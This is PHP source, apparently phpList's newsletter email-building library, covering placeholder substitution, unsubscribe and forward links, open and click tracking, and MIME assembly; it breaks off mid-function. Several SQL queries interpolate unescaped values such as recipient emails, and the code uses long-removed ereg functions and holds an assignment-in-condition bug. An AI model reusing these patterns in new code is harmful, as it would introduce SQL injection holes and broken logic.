<?php
require_once dirname(__FILE__).'/accesscheck.php';

# send an email library

if (PHPMAILER && is_file(dirname(__FILE__).'/phpmailer/class.phpmailer.php')) {
  # phplistmailer, extended of the popular phpmail class
  # this is still very experimental
  include_once dirname(__FILE__)."/class.phplistmailer.php";
} else {
  if (USE_OUTLOOK_OPTIMIZED_HTML) {
    require_once dirname(__FILE__)."/class.html.mime.mail-outlookfix.inc";
  } else {
    require_once dirname(__FILE__)."/class.html.mime.mail.inc";
  }
}

if (!function_exists("output")) {
  function output($text) {
   }
}
function sendEmail ($messageid,$email,$hash,$htmlpref = 0,$rssitems = array(),$forwardedby = array()) {
  global $strThisLink,$PoweredByImage,$PoweredByText,$cached,$website;
  if ($email == "")
    return 0;
  #0013076: different content when forwarding 'to a friend'
  if (FORWARD_ALTERNATIVE_CONTENT) {
    $forwardContent = sizeof( $forwardedby ) > 0;
    $messagedata = loadMessageData($messageid);
  } else {
    $forwardContent = 0;
  }

  if (empty($cached[$messageid])) {
    $domain = getConfig("domain");
    $message = Sql_query("select * from {$GLOBALS["tables"]["message"]} where id = $messageid");
    $cached[$messageid] = array();
    $message = Sql_fetch_array($message);
    if (ereg("([^ ]+@[^ ]+)",$message["fromfield"],$regs)) {
      # if there is an email in the from, rewrite it as "name <email>"
      $message["fromfield"] = ereg_replace($regs[0],"",$message["fromfield"]);
      $cached[$messageid]["fromemail"] = $regs[0];
      # if the email has < and > take them out here
      $cached[$messageid]["fromemail"] = ereg_replace("<","",$cached[$messageid]["fromemail"]);
      $cached[$messageid]["fromemail"] = ereg_replace(">","",$cached[$messageid]["fromemail"]);
      # make sure there are no quotes around the name
      $cached[$messageid]["fromname"] = ereg_replace('"',"",ltrim(rtrim($message["fromfield"])));
    } elseif (ereg(" ",$message["fromfield"],$regs)) {
      # if there is a space, we need to add the email
      $cached[$messageid]["fromname"] = $message["fromfield"];
      $cached[$messageid]["fromemail"] = "listmaster@$domain";
    } else {
      $cached[$messageid]["fromemail"] = $message["fromfield"] . "@$domain";

      ## makes more sense not to add the domain to the word, but the help says it does
      ## so let's keep it for now
      $cached[$messageid]["fromname"] = $message["fromfield"] . "@$domain";
    }
    # erase double spacing
    while (ereg("  ",$cached[$messageid]["fromname"]))
      $cached[$messageid]["fromname"] = eregi_replace("  "," ",$cached[$messageid]["fromname"]);

    ## this has weird effects when used with only one word, so take it out for now
#    $cached[$messageid]["fromname"] = eregi_replace("@","",$cached[$messageid]["fromname"]);

    $cached[$messageid]["fromname"] = trim($cached[$messageid]["fromname"]);
    $cached[$messageid]["to"] = $message["tofield"];
    #0013076: different content when forwarding 'to a friend'
    $cached[$messageid]["subject"] = $forwardContent ? stripslashes($messagedata["forwardsubject"]) : $message["subject"];
    $cached[$messageid]["replyto"] =$message["replyto"];
    #0013076: different content when forwarding 'to a friend'
    $cached[$messageid]["content"] = $forwardContent ? stripslashes($messagedata["forwardmessage"]) : $message["message"];
    if (USE_MANUAL_TEXT_PART && !$forwardContent) {
      $cached[$messageid]["textcontent"] = $message["textmessage"];
    } else {
      $cached[$messageid]["textcontent"] = '';
    }
    #0013076: different content when forwarding 'to a friend'
    $cached[$messageid]["footer"] = $forwardContent ? stripslashes($messagedata["forwardfooter"]) : $message["footer"];
    $cached[$messageid]["htmlformatted"] = $message["htmlformatted"];
    $cached[$messageid]["sendformat"] = $message["sendformat"];
    if ($message["template"]) {
      $req = Sql_Fetch_Row_Query("select template from {$GLOBALS["tables"]["template"]} where id = {$message["template"]}");
      $cached[$messageid]["template"] = stripslashes($req[0]);
      $cached[$messageid]["templateid"] = $message["template"];
   #   dbg("TEMPLATE: ".$req[0]);
    } else {
      $cached[$messageid]["template"] = '';
      $cached[$messageid]["templateid"] = 0;
    }

    ## @@ put this here, so it can become editable per email sent out at a later stage
    $cached[$messageid]["html_charset"] = getConfig("html_charset");
    ## @@ need to check on validity of charset
    if (!$cached[$messageid]["html_charset"])
      $cached[$messageid]["html_charset"] = 'iso-8859-1';
    $cached[$messageid]["text_charset"] = getConfig("text_charset");
    if (!$cached[$messageid]["text_charset"])
      $cached[$messageid]["text_charset"] = 'iso-8859-1';
  }# else
  #  dbg("Using cached {$cached[$messageid]["fromemail"]}");
  if (VERBOSE)
    output($GLOBALS['I18N']->get('sendingmessage').' '.$messageid.' '.$GLOBALS['I18N']->get('withsubject').' '.
      $cached[$messageid]["subject"].' '.$GLOBALS['I18N']->get('to').' '.$email);

  # erase any placeholders that were not found
#  $msg = ereg_replace("\[[A-Z ]+\]","",$msg);

#0011857: forward to friend, retain attributes
  if ($hash == 'forwarded' && defined('KEEPFORWARDERATTRIBUTES') && KEEPFORWARDERATTRIBUTES) {
    $user_att_values = getUserAttributeValues($forwardedby['email']);
  } else {
    $user_att_values = getUserAttributeValues($email);
  } 
  
  $userdata = Sql_Fetch_Assoc_Query(sprintf('select * from %s where email = "%s"',
    $GLOBALS["tables"]["user"],$email));

  $url = getConfig("unsubscribeurl");$sep = ereg('\?',$url)?'&':'?';
  $html["unsubscribe"] = sprintf('<a href="%s%suid=%s">%s</a>',$url,$sep,$hash,$strThisLink);
  $text["unsubscribe"] = sprintf('%s%suid=%s',$url,$sep,$hash);
  $html["unsubscribeurl"] = sprintf('%s%suid=%s',$url,$sep,$hash);
  $text["unsubscribeurl"] = sprintf('%s%suid=%s',$url,$sep,$hash);

  #0013076: Blacklisting posibility for unknown users
  $url = getConfig("blacklisturl");$sep = ereg('\?',$url)?'&':'?';
  $html["blacklist"] = sprintf('<a href="%s%semail=%s">%s</a>',$url,$sep,$email,$strThisLink);
  $text["blacklist"] = sprintf('%s%semail=%s',$url,$sep,$email);
  $html["blacklisturl"] = sprintf('%s%semail=%s',$url,$sep,$email);
  $text["blacklisturl"] = sprintf('%s%semail=%s',$url,$sep,$email);

  #0013076: Problem found during testing: message part must be parsed correctly as well.  
  if ($forwardContent) {
    $html["unsubscribe"] = $html["blacklist"];
    $text["unsubscribe"] = $text["blacklist"];
  }
  
  $url = getConfig("subscribeurl");$sep = ereg('\?',$url)?'&':'?';
  $html["subscribe"] = sprintf('<a href="%s">%s</a>',$url,$strThisLink);
  $text["subscribe"] = sprintf('%s',$url);
  $html["subscribeurl"] = sprintf('%s',$url);
  $text["subscribeurl"] = sprintf('%s',$url);
  $url = getConfig("forwardurl");$sep = ereg('\?',$url)?'&':'?';
  $html["forward"] = sprintf('<a href="%s%suid=%s&mid=%d">%s</a>',$url,$sep,$hash,$messageid,$strThisLink);
  $text["forward"] = sprintf('%s%suid=%s&mid=%d',$url,$sep,$hash,$messageid);
  $html["forwardurl"] = sprintf('%s%suid=%s&mid=%d',$url,$sep,$hash,$messageid);
  $text["forwardurl"] = $text["forward"];
  $url = getConfig("forwardurl");
  # make sure there are no newlines, otherwise they get turned into <br/>s
  $html["forwardform"] = sprintf('<form method="get" action="%s" name="forwardform" class="forwardform"><input type=hidden name="uid" value="%s" /><input type=hidden name="mid" value="%d" /><input type=hidden name="p" value="forward" /><input type=text name="email" value="" class="forwardinput" /><input name="Send" type="submit" value="%s" class="forwardsubmit"/></form>',$url,$hash,$messageid,$GLOBALS['strForward']);
  $text["signature"] = "\n\n--\npowered by phpList, www.phplist.com --\n\n";
  $url = getConfig("preferencesurl");$sep = ereg('\?',$url)?'&':'?';
  $html["preferences"] = sprintf('<a href="%s%suid=%s">%s</a>',$url,$sep,$hash,$strThisLink);
  $text["preferences"] = sprintf('%s%suid=%s',$url,$sep,$hash);
  $html["preferencesurl"] = sprintf('%s%suid=%s',$url,$sep,$hash);
  $text["preferencesurl"] = sprintf('%s%suid=%s',$url,$sep,$hash);
/*
  We request you retain the signature below in your emails including the links.
  This not only gives respect to the large amount of time given freely
  by the developers  but also helps build interest, traffic and use of
  PHPlist, which is beneficial to it's future development.

  You can configure how the credits are added to your pages and emails in your
  config file.

  Michiel Dethmers, phpList Ltd 2003, 2004, 2005, 2006
*/
  if (!EMAILTEXTCREDITS) {
    $html["signature"] = $PoweredByImage;#'<div align="center" id="signature"><a href="http://www.phplist.com"><img src="powerphplist.png" width=88 height=31 title="Powered by PHPlist" alt="Powered by PHPlist" border="0"></a></div>';
    # oops, accidentally became spyware, never intended that, so take it out again :-)
    $html["signature"] = preg_replace('/src=".*power-phplist.png"/','src="powerphplist.png"',$html["signature"]);
  } else {
    $html["signature"] = $PoweredByText;
  }

  $content = $cached[$messageid]["content"];
  if (preg_match("/##LISTOWNER=(.*)/",$content,$regs)) {
    $listowner = $regs[1];
    $content = ereg_replace($regs[0],"",$content);
  } else {
    $listowner = 0;
  }
  
## Fetch external content
  if ($GLOBALS["has_pear_http_request"] && preg_match("/\[URL:([^\s]+)\]/i",$content,$regs)) {
    while (isset($regs[1]) && strlen($regs[1])) {
      $url = $regs[1];
      if (!preg_match('/^http/i',$url)) {
        $url = 'http://'.$url;
      }
      $remote_content = fetchUrl($url,$userdata);
      if ($remote_content) {
        $content = eregi_replace(preg_quote($regs[0]),$remote_content,$content);
        $cached[$messageid]["htmlformatted"] = strip_tags($content) != $content;
      } else {
        logEvent("Error fetching URL: $regs[1] to send to $email");
        return 0;
      }
      preg_match("/\[URL:([^\s]+)\]/i",$content,$regs);
    }
  }
  
#~Bas 0008857 
// @@ Switched off for now, needs rigid testing, or config setting 
// $content = mailto2href($content);
// $content = encodeLinks($content);

## Fill text and html versions depending on given versions.
  if ($cached[$messageid]["htmlformatted"]) {
    if (!$cached[$messageid]["textcontent"]) {
      $textcontent = stripHTML($content);
    } else {
      $textcontent = $cached[$messageid]["textcontent"];
    }
    $htmlcontent = $content;
  } else {
#    $textcontent = $content;
    if (!$cached[$messageid]["textcontent"]) {
      $textcontent = $content;
    } else {
      $textcontent = $cached[$messageid]["textcontent"];
    }
    $htmlcontent = parseText($content);
  }

  $defaultstyle = getConfig("html_email_style");
  $adddefaultstyle = 0;

  if ($cached[$messageid]["template"])
    # template used
    $htmlmessage = eregi_replace("\[CONTENT\]",$htmlcontent,$cached[$messageid]["template"]);
  else {
    # no template used
    $htmlmessage = $htmlcontent;
    $adddefaultstyle = 1;
  }
  $textmessage = $textcontent;

## Parse placeholders
  #0013076: Blacklisting posibility for unknown users
  foreach (array("forwardform","subscribe","preferences","unsubscribe", 'blacklist') as $item) { #BUGFIX 0015303, 1/2
    if (eregi('\['.$item.'\]',$htmlmessage,$regs)) {
      $htmlmessage = eregi_replace('\['.$item.'\]',$html[$item],$htmlmessage);
//      unset($html[$item]); //ASK: Why was this done? It breaks placeholders in the footer
    }
    if (eregi('\['.$item.'\]',$textmessage,$regs)) {
      $textmessage = eregi_replace('\['.$item.'\]',$text[$item],$textmessage);
//      unset($text[$item]);
    }
  }
  #0013076: Blacklisting posibility for unknown users
  foreach (array("forward","forwardurl","subscribeurl","preferencesurl","unsubscribeurl",'blacklisturl') as $item) {
    if (eregi('\['.$item.'\]',$htmlmessage,$regs)) {
      $htmlmessage = eregi_replace('\['.$item.'\]',$html[$item],$htmlmessage);
    }
    if (eregi('\['.$item.'\]',$textmessage,$regs)) {
      $textmessage = eregi_replace('\['.$item.'\]',$text[$item],$textmessage);
    }
  }
  if ($hash != 'forwarded') {
    $text['footer'] = $cached[$messageid]["footer"];
    $html['footer'] = $cached[$messageid]["footer"];
  } else {
    #0013076: different content when forwarding 'to a friend'
    if( FORWARD_ALTERNATIVE_CONTENT ) {
      $text['footer'] = stripslashes($messagedata["forwardfooter"]);
    } else {
      $text['footer'] = getConfig('forwardfooter');
    }
    $html['footer'] = $text['footer'];
  }

  $text["footer"] = eregi_replace("\[SUBSCRIBE\]",$text["subscribe"],$text['footer']);
  $html["footer"] = eregi_replace("\[SUBSCRIBE\]",$html["subscribe"],$html['footer']);
  $text["footer"] = eregi_replace("\[PREFERENCES\]",$text["preferences"],$text["footer"]);
  $html["footer"] = eregi_replace("\[PREFERENCES\]",$html["preferences"],$html["footer"]);
  $text["footer"] = eregi_replace("\[FORWARD\]",$text["forward"],$text["footer"]);
  $html["footer"] = eregi_replace("\[FORWARD\]",$html["forward"],$html["footer"]);
  $html["footer"] = eregi_replace("\[FORWARDFORM\]",$html["forwardform"],$html["footer"]);
  $text["footer"] = eregi_replace("\[BLACKLIST\]",$text["blacklist"],$text['footer']);
  $html["footer"] = eregi_replace("\[BLACKLIST\]",$html["blacklist"],$html['footer']);
  if (sizeof($forwardedby) && isset($forwardedby['email'])) {
    $htmlmessage    = eregi_replace("\[FORWARDEDBY]",$forwardedby["email"],$htmlmessage);
    $textmessage    = eregi_replace("\[FORWARDEDBY]",$forwardedby["email"],$textmessage);
    $html["footer"] = eregi_replace("\[FORWARDEDBY]",$forwardedby["email"],$html["footer"]);
    $text["footer"] = eregi_replace("\[FORWARDEDBY]",$forwardedby["email"],$text["footer"]);
    $text["footer"] = eregi_replace("\[UNSUBSCRIBE\]",$text["blacklist"],$text['footer']);
    $html["footer"] = eregi_replace("\[UNSUBSCRIBE\]",$html["blacklist"],$html['footer']);
  } else {
    $text["footer"] = eregi_replace("\[UNSUBSCRIBE\]",$text["unsubscribe"],$text['footer']);
    $html["footer"] = eregi_replace("\[UNSUBSCRIBE\]",$html["unsubscribe"],$html['footer']);
  }

  $html["footer"] = '<div class="emailfooter">'.nl2br($html["footer"]).'</div>';

  if (eregi("\[FOOTER\]",$htmlmessage))
    $htmlmessage = eregi_replace("\[FOOTER\]",$html["footer"],$htmlmessage);
  elseif ($html["footer"])
    $htmlmessage = addHTMLFooter($htmlmessage,'<br /><br />'.$html["footer"]);
  if (eregi("\[SIGNATURE\]",$htmlmessage))
    $htmlmessage = eregi_replace("\[SIGNATURE\]",$html["signature"],$htmlmessage);
  elseif ($html["signature"])
# BUGFIX 0015303, 2/2
//    $htmlmessage .= '<br />'.$html["signature"];
      $htmlmessage = addHTMLFooter($htmlmessage, '
'. $html["signature"]);
# END BUGFIX 0015303, 2/2
  if (eregi("\[FOOTER\]",$textmessage))
    $textmessage = eregi_replace("\[FOOTER\]",$text["footer"],$textmessage);
  else
    $textmessage .= "\n\n".$text["footer"];
  if (eregi("\[SIGNATURE\]",$textmessage))
    $textmessage = eregi_replace("\[SIGNATURE\]",$text["signature"],$textmessage);
  else
    $textmessage .= "\n".$text["signature"];

#  $req = Sql_Query(sprintf('select filename,data from %s where template = %d',
#    $GLOBALS["tables"]["templateimage"],$cached[$messageid]["templateid"]));

  $htmlmessage = eregi_replace("\[USERID\]",$hash,$htmlmessage);
  $textmessage = eregi_replace("\[USERID\]",$hash,$textmessage);
  $htmlmessage = preg_replace("/\[USERTRACK\]/i",'<img src="'.$GLOBALS['scheme'].'://'.$website.$GLOBALS["pageroot"].'/ut.php?u='.$hash.'&m='.$messageid.'" width="1" height="1" border="0">',$htmlmessage,1);
  $htmlmessage = eregi_replace("\[USERTRACK\]",'',$htmlmessage);

  if ($listowner) {
    $att_req = Sql_Query("select name,value from {$GLOBALS["tables"]["adminattribute"]},{$GLOBALS["tables"]["admin_attribute"]} where {$GLOBALS["tables"]["adminattribute"]}.id = {$GLOBALS["tables"]["admin_attribute"]}.adminattributeid and {$GLOBALS["tables"]["admin_attribute"]}.adminid = $listowner");
    while ($att = Sql_Fetch_Array($att_req))
      $htmlmessage = preg_replace("#\[LISTOWNER.".strtoupper(preg_quote($att["name"]))."\]#",$att["value"],$htmlmessage);
  }

  if (is_array($GLOBALS["default_config"])) {
    foreach($GLOBALS["default_config"] as $key => $val) {
      if (is_array($val)) {
        $htmlmessage = eregi_replace("\[$key\]",getConfig($key),$htmlmessage);
        $textmessage = eregi_replace("\[$key\]",getConfig($key),$textmessage);
      }
    }
  }
## RSS
  if (ENABLE_RSS && sizeof($rssitems)) {
    $rssentries = array();
    $request = join(",",$rssitems);
    $texttemplate = getConfig("rsstexttemplate");
    $htmltemplate = getConfig("rsshtmltemplate");
    $textseparatortemplate = getConfig("rsstextseparatortemplate");
    $htmlseparatortemplate = getConfig("rsshtmlseparatortemplate");
    $req = Sql_Query("select * from {$GLOBALS["tables"]["rssitem"]} where id in ($request) order by list,added");
    $curlist = "";
    while ($row = Sql_Fetch_array($req)) {
      if ($curlist != $row["list"]) {
        $row["listname"] = ListName($row["list"]);
        $curlist = $row["list"];
        $rssentries["text"] .= parseRSSTemplate($textseparatortemplate,$row);
        $rssentries["html"] .= parseRSSTemplate($htmlseparatortemplate,$row);
      }

      $data_req = Sql_Query("select * from {$GLOBALS["tables"]["rssitem_data"]} where itemid = {$row["id"]}");
      while ($data = Sql_Fetch_Array($data_req))
        $row[$data["tag"]] = $data["data"];

      $rssentries["text"] .= stripHTML(parseRSSTemplate($texttemplate,$row));
      $rssentries["html"] .= parseRSSTemplate($htmltemplate,$row);
    }
    $htmlmessage = eregi_replace("\[RSS\]",$rssentries["html"],$htmlmessage);
    $textmessage = eregi_replace("\[RSS\]",$rssentries["text"],$textmessage);
  }

  if (is_array($userdata)) {
    foreach ($userdata as $name => $value) {
      if (eregi("\[".$name."\]",$htmlmessage,$regs)) {
        $htmlmessage = eregi_replace("\[".$name."\]",$value,$htmlmessage);
      }
      if (eregi("\[".$name."\]",$textmessage,$regs)) {
        $textmessage = eregi_replace("\[".$name."\]",$value,$textmessage);
      }
    }
  }
  
  $destinationemail = '';
  if (is_array($user_att_values)) {
    foreach ($user_att_values as $att_name => $att_value) {
      if (eregi("\[".$att_name."\]",$htmlmessage,$regs)) {
        # the value may be a multiline textarea field
        $htmlatt_value = str_replace("\n","<br/>\n",$att_value);
        $htmlmessage = eregi_replace("\[".$att_name."\]",$htmlatt_value,$htmlmessage);
      }
      if (eregi("\[".$att_name."\]",$textmessage,$regs)) {
        $textmessage = eregi_replace("\[".$att_name."\]",$att_value,$textmessage);
      }
      # @@@ undocumented, use alternate field for real email to send to
      if (isset($GLOBALS["alternate_email"]) && strtolower($att_name) == strtolower($GLOBALS["alternate_email"])) {
        $destinationemail = $att_value;
      }
    }
  }
  if (!$destinationemail) {
    $destinationemail = $email;
  }
  if (!ereg('@',$destinationemail) && isset($GLOBALS["expand_unqualifiedemail"])) {
    $destinationemail .= $GLOBALS["expand_unqualifiedemail"];
  }

  if (eregi("\[LISTS\]",$htmlmessage)) {
    $lists = "";$listsarr = array();
    $req = Sql_Query(sprintf('select list.name from %s as list,%s as listuser where list.id = listuser.listid and listuser.userid = %d',$GLOBALS["tables"]["list"],$GLOBALS["tables"]["listuser"],$user_system_values["id"]));
    while ($row = Sql_Fetch_Row($req)) {
      array_push($listsarr,$row[0]);
    }
    $lists_html = join('<br/>',$listsarr);
    $lists_text = join("\n",$listsarr);
    $htmlmessage = ereg_replace("\[LISTS\]",$lists_html,$htmlmessage);
    $textmessage = ereg_replace("\[LISTS\]",$lists_text,$textmessage);
  }

  ## click tracking
  # for now we won't click track forwards, as they are not necessarily users, so everything would fail

  if (CLICKTRACK && $hash != 'forwarded') {
    $urlbase = '';
    # let's leave this for now
    /*
    if (preg_match('/<base href="(.*)"([^>]*)>/Umis',$htmlmessage,$regs)) {
      $urlbase = $regs[1];
    } else {
      $urlbase = '';
    }
#    print "URLBASE: $urlbase<br/>";
    */

    # convert html message
#    preg_match_all('/<a href="?([^> "]*)"?([^>]*)>(.*)<\/a>/Umis',$htmlmessage,$links);
    preg_match_all('/<a(.*)href=["\'](.*)["\']([^>]*)>(.*)<\/a>/Umis',$htmlmessage,$links);

    # to process the Yahoo webpage with base href and link like <a href=link> we'd need this one
#    preg_match_all('/<a href=([^> ]*)([^>]*)>(.*)<\/a>/Umis',$htmlmessage,$links);
    $clicktrack_root = sprintf('%s://%s/lt.php',$GLOBALS["scheme"],$website.$GLOBALS["pageroot"]);
    for($i=0; $i<count($links[2]); $i++){
      $link = cleanUrl($links[2][$i]);
      $link = str_replace('"','',$link);
      if (preg_match('/\.$/',$link)) {
        $link = substr($link,0,-1);
      }
      $linkid = 0;
#      print "LINK: $link<br/>";
      if ((preg_match('/^http|ftp/',$link) || preg_match('/^http|ftp/',$urlbase)) && $link != 'http://www.phplist.com' && !strpos($link,$clicktrack_root)) {
        # take off personal uids
        $url = cleanUrl($link,array('PHPSESSID','uid'));

#        $url = preg_replace('/&uid=[^\s&]+/','',$link);

#        if (!strpos('http:',$link)) {
#          $link = $urlbase . $link;
#        }

        $req = Sql_Query(sprintf('insert ignore into %s (messageid,userid,url,forward)
          values(%d,%d,"%s","%s")',$GLOBALS['tables']['linktrack'],$messageid,$userdata['id'],$url,addslashes($link)));
        $req = Sql_Fetch_Row_Query(sprintf('select linkid from %s where messageid = %s and userid = %d and forward = "%s"
        ',$GLOBALS['tables']['linktrack'],$messageid,$userdata['id'],$link));
        $linkid = $req[0];

        $masked = "H|$linkid|$messageid|".$userdata['id'] ^ XORmask;
        $masked = urlencode(base64_encode($masked));
        $newlink = sprintf('<a%shref="%s://%s/lt.php?id=%s" %s>%s</a>',$links[1][$i],$GLOBALS["scheme"],$website.$GLOBALS["pageroot"],$masked,$links[3][$i],$links[4][$i]);
        $htmlmessage = str_replace($links[0][$i], $newlink, $htmlmessage);
      }
    }

    # convert Text message
    # first find occurances of our top domain, to avoid replacing them later

    # hmm, this is no point, it's not just *our* topdomain, but any 

if (0) {
    preg_match_all('#(https?://'.$GLOBALS['website'].'/?)\s+#mis',$textmessage,$links);
#    preg_match_all('#(https?://[a-z0-9\./\#\?&:@=%\-]+)#ims',$textmessage,$links);
#    preg_match_all('!(https?:\/\/www\.[a-zA-Z0-9\.\/#~\?+=&%@-_]+)!mis',$textmessage,$links);

    for($i=0; $i<count($links[1]); $i++){
      # not entirely sure why strtolower was used, but it seems to break things http://mantis.phplist.com/view.php?id=4406
#      $link = strtolower(cleanUrl($links[1][$i]));
      $link = cleanUrl($links[1][$i]);
      if (preg_match('/\.$/',$link)) {
        $link = substr($link,0,-1);
      }
      $linkid = 0;
      if (preg_match('/^http|ftp/',$link) && $link != 'http://www.phplist.com' && !strpos($link,$clicktrack_root)) {
        $url = cleanUrl($link,array('PHPSESSID','uid'));
        $req = Sql_Query(sprintf('insert ignore into %s (messageid,userid,url,forward)
          values(%d,%d,"%s","%s")',$GLOBALS['tables']['linktrack'],$messageid,$userdata['id'],$url,$link));
        $req = Sql_Fetch_Row_Query(sprintf('select linkid from %s where messageid = %s and userid = %d and forward = "%s"
        ',$GLOBALS['tables']['linktrack'],$messageid,$userdata['id'],$link));
        $linkid = $req[0];

        $masked = "T|$linkid|$messageid|".$userdata['id'] ^ XORmask;
        $masked = urlencode(base64_encode($masked));
        $newlink = sprintf('%s://%s/lt.php?id=%s',$GLOBALS["scheme"],$website.$GLOBALS["pageroot"],$masked);
        $textmessage = str_replace($links[0][$i], '<'.$newlink.'>', $textmessage);
      }
    }

}
    #now find the rest
    # @@@ needs to expand to find complete urls like:
    #http://user:password@www.web-site.com:1234/document.php?parameter=something&otherpar=somethingelse#anchor
    # or secure
    #https://user:password@www.website.com:2345/document.php?parameter=something%20&otherpar=somethingelse#anchor

    preg_match_all('#(https?://[^\s\>\}\,]+)#mis',$textmessage,$links);
#    preg_match_all('#(https?://[a-z0-9\./\#\?&:@=%\-]+)#ims',$textmessage,$links);
#    preg_match_all('!(https?:\/\/www\.[a-zA-Z0-9\.\/#~\?+=&%@-_]+)!mis',$textmessage,$links);
    ## sort the results in reverse order, so that they are replaced correctly
    rsort($links[1]);
    $newlinks = array();

    for($i=0; $i<count($links[1]); $i++){
      $link = cleanUrl($links[1][$i]);
      if (preg_match('/\.$/',$link)) {
        $link = substr($link,0,-1);
      }
  
      $linkid = 0;
      if (preg_match('/^http|ftp/',$link) && $link != 'http://www.phplist.com') {# && !strpos($link,$clicktrack_root)) {
        $url = cleanUrl($link,array('PHPSESSID','uid'));

        $req = Sql_Query(sprintf('insert ignore into %s (messageid,userid,url,forward)
          values(%d,%d,"%s","%s")',$GLOBALS['tables']['linktrack'],$messageid,$userdata['id'],$url,$link));
        $req = Sql_Fetch_Row_Query(sprintf('select linkid from %s where messageid = %s and userid = %d and forward = "%s"
        ',$GLOBALS['tables']['linktrack'],$messageid,$userdata['id'],$link));
        $linkid = $req[0];

        $masked = "T|$linkid|$messageid|".$userdata['id'] ^ XORmask;
        $masked = urlencode(base64_encode($masked));
        $newlinks[$linkid] = sprintf('%s://%s/lt.php?id=%s',$GLOBALS["scheme"],$website.$GLOBALS["pageroot"],$masked);
#        print $links[0][$i] .' -> '.$newlink.'<br/>';
        $textmessage = str_replace($links[1][$i], '[%%%'.$linkid.'%%%]', $textmessage);
      }
    }
    foreach ($newlinks as $linkid => $newlink) {
      $textmessage = str_replace('[%%%'.$linkid.'%%%]',$newlink, $textmessage);
    }
  }

  #
  if (eregi("\[LISTS\]",$htmlmessage)) {
    $lists = "";$listsarr = array();
    $req = Sql_Query(sprintf('select list.name from %s as list,%s as listuser where list.id = listuser.listid and listuser.userid = %d',$tables["list"],$tables["listuser"],$user_system_values["id"]));
    while ($row = Sql_Fetch_Row($req)) {
      array_push($listsarr,$row[0]);
    }
    $lists_html = join('<br/>',$listsarr);
    $lists_text = join("\n",$listsarr);
    $htmlmessage = ereg_replace("\[LISTS\]",$lists_html,$htmlmessage);
    $textmessage = ereg_replace("\[LISTS\]",$lists_text,$textmessage);
  }

  #0011996: forward to friend - personal message
  if (FORWARD_PERSONAL_NOTE_SIZE && $hash = 'forwarded' && !empty($forwardedby['personalNote']) ) {
    $htmlmessage =  nl2br($forwardedby['personalNote']) . '<br/>' .  $htmlmessage;
    $textmessage = $forwardedby['personalNote'] . "\n" . $textmessage;
  }
  
  ## remove any existing placeholders
  $htmlmessage = eregi_replace("\[[A-Z\. ]+\]","",$htmlmessage);
  $textmessage = eregi_replace("\[[A-Z\. ]+\]","",$textmessage);

  ## check that the HTML message as proper <head> </head> and <body> </body> tags
  # some readers fail when it doesn't
  if (!preg_match("#<body.*</body>#ims",$htmlmessage)) {
    $htmlmessage = '<body>'.$htmlmessage.'</body>';
  }
  if (!preg_match("#<head>.*</head>#ims",$htmlmessage)) {
    if (!$adddefaultstyle) {
     $defaultstyle = "";
    }
    $htmlmessage = '<head>
        <meta content="text/html;charset='.$cached[$messageid]["html_charset"].'" http-equiv="Content-Type">
        <title></title>'.$defaultstyle.'</head>'.$htmlmessage;
  }
  if (!preg_match("#<html>.*</html>#ims",$htmlmessage)) {
    $htmlmessage = '<html>'.$htmlmessage.'</html>';
  }

  # particularly Outlook seems to have trouble if it is not \r\n
  # reports have come that instead this creates lots of trouble
  # this is now done in the global sendMail function, so it is not
  # necessary here
#  if (USE_CARRIAGE_RETURNS) {
#    $htmlmessage = preg_replace("/\r?\n/", "\r\n", $htmlmessage);
#    $textmessage = preg_replace("/\r?\n/", "\r\n", $textmessage);
#  }

  ## build the email
  if (!PHPMAILER) {
    $mail = new html_mime_mail(
      array('X-Mailer: PHPlist v'.VERSION,
            "X-MessageId: $messageid",
            "X-ListMember: $email",
            "Precedence: bulk",
            "List-Help: <".$text["preferences"].">",
            "List-Unsubscribe: <".$text["unsubscribe"].">",
            "List-Subscribe: <".getConfig("subscribeurl").">",
            "List-Owner: <mailto:".getConfig("admin_address").">"
    ));
  } else {
    $mail = new PHPlistMailer($messageid,$destinationemail);
    if ($forwardedby) {
      $mail->add_timestamp();
    }
    #$mail->IsSMTP();
  }

  list($dummy,$domaincheck) = split('@',$destinationemail);
  $text_domains = explode("\n",trim(getConfig("alwayssendtextto")));
  if (in_array($domaincheck,$text_domains)) {
    $htmlpref = 0;
    if (VERBOSE)
      output($GLOBALS['I18N']->get('sendingtextonlyto')." $domaincheck");
  }

  list($dummy,$domaincheck) = split('@',$email);
  $text_domains = explode("\n",trim(getConfig("alwayssendtextto")));
  if (in_array($domaincheck,$text_domains)) {
    $htmlpref = 0;
    if (VERBOSE)
      output("Sending text only to $domaincheck");
  }

  # so what do we actually send?
  switch($cached[$messageid]["sendformat"]) {
    case "HTML":
//      # send html to users who want it and text to everyone else
//      if ($htmlpref) {
//        Sql_Query("update {$GLOBALS["tables"]["message"]} set ashtml = ashtml + 1 where id = $messageid");
//        if (ENABLE_RSS && sizeof($rssitems))
//          updateRSSStats($rssitems,"ashtml");
//      #  dbg("Adding HTML ".$cached[$messageid]["templateid"]);
//        $mail->add_html($htmlmessage,"",$cached[$messageid]["templateid"]);
//        addAttachments($messageid,$mail,"HTML");
//      } else {
//        Sql_Query("update {$GLOBALS["tables"]["message"]} set astext = astext + 1 where id = $messageid");
//        if (ENABLE_RSS && sizeof($rssitems))
//          updateRSSStats($rssitems,"astext");
//        $mail->add_text($textmessage);
//        addAttachments($messageid,$mail,"text");
//      }
//      break;
    case "both":
    case "text and HTML":
      # send one big file to users who want html and text to everyone else
      if ($htmlpref) {
        Sql_Query("update {$GLOBALS["tables"]["message"]} set ashtml = ashtml + 1 where id = $messageid");
        if (ENABLE_RSS && sizeof($rssitems))
          updateRSSStats($rssitems,"ashtml");
      #  dbg("Adding HTML ".$cached[$messageid]["templateid"]);
      ## wrap it: http://mantis.phplist.com/view.php?id=15528
        $htmlmessage = wordwrap($htmlmessage, 60, "\r\n");
        $mail->add_html($htmlmessage,$textmessage,$cached[$messageid]["templateid"]);
        addAttachments($messageid,$mail,"HTML");
      } else {
        Sql_Query("update {$GLOBALS["tables"]["message"]} set astext = astext + 1 where id = $messageid");
        if (ENABLE_RSS && sizeof($rssitems))
          updateRSSStats($rssitems,"astext");
        $mail->add_text($textmessage);
        addAttachments($messageid,$mail,"text");
      }
      break;
    case "PDF":
      # send a PDF file to users who want html and text to everyone else
      if (ENABLE_RSS && sizeof($rssitems))
        updateRSSStats($rssitems,"astext");
      if ($htmlpref) {
        Sql_Query("update {$GLOBALS["tables"]["message"]} set aspdf = aspdf + 1 where id = $messageid");
        $pdffile = createPdf($textmessage);
        if (is_file($pdffile) && filesize($pdffile)) {
          $fp = fopen($pdffile,"r");
          if ($fp) {
